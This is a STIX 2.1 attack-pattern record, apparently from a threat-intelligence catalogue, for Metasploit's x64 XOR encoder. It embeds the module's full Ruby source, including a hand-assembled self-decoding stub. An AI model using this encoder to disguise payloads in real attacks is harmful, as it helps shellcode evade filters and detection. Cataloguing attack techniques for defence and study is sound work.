{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--03f36517-06a1-42c6-80e4-8049ace5d747",
    "created": "2024-08-14T16:33:19.244753Z",
    "modified": "2024-08-14T16:33:19.244757Z",
    "name": "XOR Encoder",
    "description": "An x64 XOR encoder. Uses an 8 byte key and takes advantage of x64 relative addressing.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x64/xor.rb",
            "external_id": "xor.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::Xor\n\n  def initialize\n    super(\n      'Name'             => 'XOR Encoder',\n      'Description'      => 'An x64 XOR encoder. Uses an 8 byte key and takes advantage of x64 relative addressing.',\n      'Author'           => [ 'sf' ],\n      'Arch'             => ARCH_X64,\n      'License'          => MSF_LICENSE,\n      'Decoder'          =>\n        {\n          'KeySize'      => 8,\n          'KeyPack'      => 'Q',\n          'BlockSize'    => 8,\n        }\n      )\n  end\n  # Indicate that this module can preserve some registers\n  # ...which is currently not true. This is a temp fix\n  # until the full preserve_registers functionality is\n  # implemented.\n  def can_preserve_registers?\n    true\n  end\n\n  def decoder_stub( state )\n\n    # calculate the (negative) block count . We should check this against state.badchars.\n    block_count = [-( ( (state.buf.length - 1) / state.decoder_key_size) + 1)].pack( \"V\" )\n\n    decoder =   \"\\x48\\x31\\xC9\" +                 # xor rcx, rcx\n          \"\\x48\\x81\\xE9\" + block_count +   # sub ecx, block_count\n          \"\\x48\\x8D\\x05\\xEF\\xFF\\xFF\\xFF\" + # lea rax, [rel 0x0]\n          \"\\x48\\xBBXXXXXXXX\" +             # mov rbx, 0x????????????????\n          \"\\x48\\x31\\x58\\x27\" +             # xor [rax+0x27], rbx\n          \"\\x48\\x2D\\xF8\\xFF\\xFF\\xFF\" +     # sub rax, -8\n          \"\\xE2\\xF4\"                       # loop 0x1B\n\n    state.decoder_key_offset = decoder.index( 'XXXXXXXX' )\n\n    return decoder\n  end\nend\n"
}